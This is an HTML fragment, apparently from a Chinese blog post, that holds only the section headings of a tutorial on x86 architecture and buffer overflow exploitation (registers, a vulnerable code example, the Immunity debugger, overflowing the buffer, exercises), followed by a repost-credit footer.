+        <h1 id="一：X86体系结构简介"><a href="#一：X86体系结构简介" class="headerlink" title="一：X86体系结构简介"></a>一：X86体系结构简介</h1><h4 id="1：程序存储器"><a href="#1：程序存储器" class="headerlink" title="1：程序存储器"></a>1：程序存储器</h4><h4 id="2：CPU-寄存器"><a href="#2：CPU-寄存器" class="headerlink" title="2：CPU 寄存器"></a>2：CPU 寄存器</h4><h1 id="二：缓冲区溢出实操"><a href="#二：缓冲区溢出实操" class="headerlink" title="二：缓冲区溢出实操"></a>二：缓冲区溢出实操</h1><h4 id="1：易受攻击代码实例"><a href="#1：易受攻击代码实例" class="headerlink" title="1：易受攻击代码实例"></a>1：易受攻击代码实例</h4><h4 id="2：immunity调试器"><a href="#2：immunity调试器" class="headerlink" title="2：immunity调试器"></a>2：immunity调试器</h4><h4 id="3：导航代码"><a href="#3：导航代码" class="headerlink" title="3：导航代码"></a>3：导航代码</h4><h4 id="4：溢出缓冲区"><a href="#4：溢出缓冲区" class="headerlink" title="4：溢出缓冲区"></a>4：溢出缓冲区</h4><h4 id="5：Exercises"><a href="#5：Exercises" class="headerlink" title="5：Exercises"></a>5：Exercises</h4>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 2662904153@qq.com </span>
     </div>
